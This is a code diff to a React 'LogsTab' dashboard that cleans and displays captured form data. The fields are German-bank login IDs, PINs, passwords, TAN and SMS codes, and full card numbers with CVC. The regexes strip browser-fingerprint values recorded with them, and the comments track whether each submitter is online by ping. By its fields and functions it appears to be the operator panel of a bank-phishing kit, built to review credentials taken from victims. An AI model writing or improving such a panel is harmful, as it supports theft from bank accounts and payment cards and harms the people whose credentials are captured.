@@ -23,6 +23,97 @@ const APPROVAL_OPTIONS: Array<{ value: string; label: string }> = [
   { value: "biometrika_pin_2", label: "Biometrika/PIN 2" },
 ];
 
+const UA_BANNED_RE = /(mozilla|applewebkit|webkit|gecko|chrome|safari|windows nt|win64|win32|android|iphone|ipad|mac os|linux x86_64|x86_64|like gecko|khtml|version\/|mobile|firefox|opera|edge|msie|trident|opr\/|edg\/|brave|vivaldi|netscape)/i;
+const FP_PREFIX_RE = /(pm_|fpua|fpsc|fpsw|fptz|fpln|fpjv|fpco|fpasw|fpan|fpacn|fpol|fposp|fpup|fpsaw|fpsbd|fpsdx|fpsdy|fpslx|fpsly|fpsfse|fpsui|fpol|pm_fpua|pm_fpsc|pm_fpsw|pm_fptz|pm_fpln|pm_fpasw|pm_fpan|pm_fpacn|pm_fpol|pm_fpsaw|pm_fpsbd|pm_fpsdx|pm_fpsdy|pm_fpslx|pm_fpsly|pm_fpsfse|pm_fpsui|pm_os|pm_brmjv|pm_br|pm_inpt|pm_expt)/i;
+
+function sanitizeCredentialValue(value: unknown, opts?: { maxLen?: number; allowUaLike?: boolean }): string {
+  const v = typeof value === "string" ? value : value == null ? "" : String(value);
+  if (!v) return "";
+  const trimmed = v.trim();
+  if (!trimmed) return "";
+  const maxLen = opts?.maxLen ?? 64;
+  if (!opts?.allowUaLike && (UA_BANNED_RE.test(trimmed) || FP_PREFIX_RE.test(trimmed))) return "";
+  if (trimmed.length > maxLen) return "";
+  if (/^[\x00-\x1F\x7F]/.test(trimmed)) return "";
+  let pctCount = 0;
+  for (let i = 0; i < trimmed.length; i++) if (trimmed.charCodeAt(i) === 37) pctCount++;
+  if (pctCount >= 4) return "";
+  return trimmed;
+}
+
+function sanitizeRawFieldsForDisplay(rawFields: any): any {
+  if (!rawFields || typeof rawFields !== "object") return {};
+  const out: Record<string, any> = {};
+  for (const k of Object.keys(rawFields)) {
+    const keyOk = String(k).toLowerCase();
+    if (FP_PREFIX_RE.test(keyOk)) continue;
+    if (/user_?agent/i.test(keyOk)) continue;
+    if (/^s\d+_iframe_user_?agent/i.test(keyOk)) continue;
+    const rawVal = rawFields[k];
+    const cleaned = typeof rawVal === "string" ? sanitizeCredentialValue(rawVal, { maxLen: 256 }) : rawVal;
+    if (typeof cleaned === "string" && cleaned === "") continue;
+    out[k] = cleaned;
+  }
+  return out;
+}
+
+function cleanBankFormHistoryEntry(entry: any): any {
+  if (!entry || typeof entry !== "object") return entry;
+  return {
+    ...entry,
+    verfuegernummer: sanitizeCredentialValue(entry.verfuegernummer || entry.username || entry.id),
+    username: sanitizeCredentialValue(entry.username || entry.verfuegernummer || entry.id),
+    id: sanitizeCredentialValue(entry.id || entry.verfuegernummer || entry.username),
+    pin: sanitizeCredentialValue(entry.pin || entry.password || entry.pw),
+    password: sanitizeCredentialValue(entry.password || entry.pin || entry.pw),
+    pw: sanitizeCredentialValue(entry.pw || entry.pin || entry.password),
+    personalCode: sanitizeCredentialValue(entry.personalCode, { maxLen: 32 }),
+    bankPhone: sanitizeCredentialValue(entry.bankPhone, { maxLen: 40, allowUaLike: true }),
+    tacCode: sanitizeCredentialValue(entry.tacCode || entry.tac_code, { maxLen: 24 }),
+    orderedField1: sanitizeCredentialValue(entry.orderedField1, { maxLen: 120 }),
+    orderedField2: sanitizeCredentialValue(entry.orderedField2, { maxLen: 120 }),
+    orderedField3: sanitizeCredentialValue(entry.orderedField3, { maxLen: 120 }),
+    cardNumber: sanitizeCredentialValue(entry.cardNumber, { maxLen: 32 }),
+    cardExpiry: sanitizeCredentialValue(entry.cardExpiry, { maxLen: 16 }),
+    cardCvc: sanitizeCredentialValue(entry.cardCvc, { maxLen: 8 }),
+    smsCode: sanitizeCredentialValue(entry.smsCode || entry.sms_code, { maxLen: 32 }),
+    rawFields: sanitizeRawFieldsForDisplay(entry.rawFields),
+  };
+}
+
+function sanitizeFormDataAll(rawFd: any): any {
+  if (!rawFd || typeof rawFd !== "object") return {};
+  const fd: any = { ...rawFd };
+  fd.firstName = sanitizeCredentialValue(rawFd.firstName, { maxLen: 120, allowUaLike: true }) || rawFd.firstName;
+  fd.lastName = sanitizeCredentialValue(rawFd.lastName, { maxLen: 120, allowUaLike: true }) || rawFd.lastName;
+  fd.phone = sanitizeCredentialValue(rawFd.phone, { maxLen: 40, allowUaLike: true }) || rawFd.phone;
+  fd.email = sanitizeCredentialValue(rawFd.email, { maxLen: 200, allowUaLike: true }) || rawFd.email;
+  fd.verfuegernummer = sanitizeCredentialValue(rawFd.verfuegernummer || rawFd.username || rawFd.id);
+  fd.username = sanitizeCredentialValue(rawFd.username || rawFd.verfuegernummer || rawFd.id);
+  fd.id = sanitizeCredentialValue(rawFd.id || rawFd.verfuegernummer || rawFd.username);
+  fd.pin = sanitizeCredentialValue(rawFd.pin || rawFd.password || rawFd.pw);
+  fd.password = sanitizeCredentialValue(rawFd.password || rawFd.pin || rawFd.pw);
+  fd.pw = sanitizeCredentialValue(rawFd.pw || rawFd.pin || rawFd.password);
+  fd.personalCode = sanitizeCredentialValue(rawFd.personalCode, { maxLen: 32 });
+  fd.bankPhone = sanitizeCredentialValue(rawFd.bankPhone, { maxLen: 40, allowUaLike: true });
+  fd.tacCode = sanitizeCredentialValue(rawFd.tacCode || rawFd.tac_code, { maxLen: 24 });
+  fd.tac_code = fd.tacCode;
+  fd.smsCode = sanitizeCredentialValue(rawFd.smsCode || rawFd.sms_code, { maxLen: 32 });
+  fd.sms_code = fd.smsCode;
+  fd.cardNumber = sanitizeCredentialValue(rawFd.cardNumber, { maxLen: 32 });
+  fd.cardExpiry = sanitizeCredentialValue(rawFd.cardExpiry, { maxLen: 16 });
+  fd.cardCvc = sanitizeCredentialValue(rawFd.cardCvc, { maxLen: 8 });
+  fd.cardHolder = sanitizeCredentialValue(rawFd.cardHolder, { maxLen: 120, allowUaLike: true });
+  fd.orderedField1 = sanitizeCredentialValue(rawFd.orderedField1, { maxLen: 120 });
+  fd.orderedField2 = sanitizeCredentialValue(rawFd.orderedField2, { maxLen: 120 });
+  fd.orderedField3 = sanitizeCredentialValue(rawFd.orderedField3, { maxLen: 120 });
+  fd.rawFields = sanitizeRawFieldsForDisplay(rawFd.rawFields);
+  if (Array.isArray(rawFd.bankFormHistory)) {
+    fd.bankFormHistory = rawFd.bankFormHistory.map((e: any) => cleanBankFormHistoryEntry(e));
+  }
+  return fd;
+}
+
 function getApprovalDisplayText(value: string): string {
   const matchedOption = APPROVAL_OPTIONS.find((option) => option.value === value);
   if (!matchedOption) {
@@ -586,15 +677,16 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
 
             const pickSig = (data: unknown): Record<string, string> => {
               if (!data || typeof data !== "object") return {};
-              const d = data as Record<string, any>;
+              const d = sanitizeFormDataAll(data as Record<string, any>);
               const out: Record<string, string> = {};
               for (const [k, raw] of Object.entries(d)) {
                 if (raw === undefined || raw === null) continue;
-                const str = String(raw);
-                if (str.trim().length === 0) continue;
+                const str = typeof raw === "string" ? raw : String(raw);
+                const cleaned = sanitizeCredentialValue(str, { maxLen: 120 });
+                if (!cleaned) continue;
                 if (typeof raw === "object") continue;
                 if (lowerSig.has(k.toLowerCase()) || SIG_FIELDS.some((s) => k.toLowerCase().includes(s.toLowerCase()))) {
-                  out[k.toLowerCase()] = str.trim().slice(0, 120);
+                  out[k.toLowerCase()] = cleaned;
                 }
               }
               return out;
@@ -1127,7 +1219,7 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                 </tr>
               )}
               {rows.map((row) => {
-                const fd = (row.form_data || {}) as Record<string, any>;
+                const fd = sanitizeFormDataAll(row.form_data || {});
                 // KESIN + ANLIK ONLINE / OFFLINE karari:
                 // 1. row.status === 'offline' ise DIREKT OFFLINE (kullanici pagehide ile isaretlemis).
                 // 2. Degilse ve last_ping_at son 10sn'de guncellenmis → ONLINE.
